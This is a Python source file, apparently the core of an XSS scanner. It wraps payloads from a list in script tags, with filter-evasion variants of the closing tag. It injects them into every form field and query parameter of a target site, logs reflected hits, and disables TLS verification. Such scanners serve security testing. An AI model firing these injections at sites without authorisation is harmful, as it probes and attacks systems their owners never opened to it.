from lib.helper.helper import *
from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from lib.helper.Log import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class core:
    
    @classmethod
    def load_payloads(cls, filename):
        filepath = os.path.join(os.path.dirname(__file__), filename)
        with open(filepath, 'r') as file:
            return [line.strip() for line in file.readlines()]
    
    @classmethod
    def generate(cls, eff):
        FUNCTION = cls.load_payloads('payload1.txt')  # Menggunakan payload1.txt
        if eff == 1:
            return "<script/>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<\script\>"
        elif eff == 2:
            return "<\script/>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<\\script>"
        elif eff == 3:
            return "<\script\> " + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<//script>"
        elif eff == 4:
            return "<script>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<\script/>"
        elif eff == 5:
            return "<script>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<//script>"
        elif eff == 6:
            return "<script>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "</script>"

    @classmethod
    def post_method(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        forms = bsObj.find_all("form", method=True)
        
        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = cls.url
                
            if form["method"].lower().strip() == "post":
                Log.warning("Target have form with POST method: " + C + urljoin(cls.url, action))
                Log.info("Collecting form input key.....")
                
                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})
                        else:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + cls.payload)
                            keys.update({key["name"]: cls.payload})
                    except Exception as e:
                        Log.info("Internal error: " + str(e))
                
                Log.info("Sending payload (POST) method...")
                req = cls.session.post(urljoin(cls.url, action), data=keys)
                if cls.payload in req.text:
                    Log.high("Detected XSS (POST) at " + urljoin(cls.url, req.url))
                    with open("xss.txt", "a") as file:
                        file.write(str(req.url) + "\n\n")
                    Log.high("Post data: " + str(keys))
                else:
                    Log.info("Parameter page using (POST) payloads but not 100% yet...")
    
    @classmethod
    def get_method_form(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        forms = bsObj.find_all("form", method=True)
        
        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = cls.url
                
            if form["method"].lower().strip() == "get":
                Log.warning("Target have form with GET method: " + C + urljoin(cls.url, action))
                Log.info("Collecting form input key.....")
                
                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})
                        else:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + cls.payload)
                            keys.update({key["name"]: cls.payload})
                    except Exception as e:
                        Log.info("Internal error: " + str(e))
                        try:
                            Log.info("Form key name: " + G + key["name"] + N + " value: " + G + cls.payload)
                            keys.update({key["name"]: cls.payload})
                        except KeyError as e:
                            Log.info("Internal error: " + str(e))
                        
                Log.info("Sending payload (GET) method...")
                req = cls.session.get(urljoin(cls.url, action), params=keys)
                if cls.payload in req.text:
                    Log.high("Detected XSS (GET) at " + urljoin(cls.url, req.url))
                    with open("xss.txt", "a") as file:
                        file.write(str(req.url) + "\n\n")
                    Log.high("GET data: " + str(keys))
                else:
                    Log.info("\033[0;35;47m Parameter page using (GET) payloads but not 100% yet...")
        
    @classmethod
    def get_method(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        links = bsObj.find_all("a", href=True)
        #for a in links:
        	#url = a["href"]
        	#print(url)
        for a in links:
            url = a["href"]
            if not (url.startswith("http://") or url.startswith("https://") or url.startswith("mailto:")):
                base = urljoin(cls.url, a["href"])
                query = urlparse(base).query
                #print ("budi")
                #print(base)
                #print
                #print(query)
                #exit()
                if query != "":
                    Log.warning("Found link with query: " + G + query + N + " Maybe a vuln XSS point")
                    
                    query_payload = query.replace(query[query.find("=")+1:len(query)], cls.payload, 1)
                    test = base.replace(query, query_payload, 1)
                    
                    query_all = base.replace(query, urlencode({x: cls.payload for x in parse_qs(query)}))
                    
                    Log.info("Query (GET) : " + test)
                    Log.info("Query (GET) : " + query_all)

                    if not url.startswith("mailto:") and not url.startswith("tel:"):                    
                        _respon = cls.session.get(test, verify=False)
                        if cls.payload in _respon.text or cls.payload in cls.session.get(query_all).text:
                            Log.high("Detected XSS (GET) at " + _respon.url)
                            with open("xss.txt", "a") as file:
                                file.write(str(_respon.url) + "\n\n")
                        else:
                            Log.info("Parameter page using (GET) payloads but not 100% yet...")
                    else:
                        Log.info("URL is not an HTTP url, ignoring")
    
    @classmethod
    def main(cls, url, proxy, headers, payload, cookie, method=2):
    
        print(W + "*"*15)
        cls.payload = payload
        cls.url = url
        
        cls.session = session(proxy, headers, cookie)
        Log.info("Checking connection to: " + Y + url)    
        try:
            ctr = cls.session.get(url)
            cls.body = ctr.text
        except Exception as e:
            Log.high("Internal error: " + str(e))
            return
        
        if ctr.status_code > 400:
            Log.info("Connection failed " + G + str(ctr.status_code))
            return 
        else:
            Log.info("Connection estabilished " + G + str(ctr.status_code))
        
        if method >= 2:
            cls.post_method()
            cls.get_method()
            cls.get_method_form()
            
        elif method == 1:
            cls.post_method()
            
        elif method == 0:
            cls.get_method()
            cls.get_method_form()
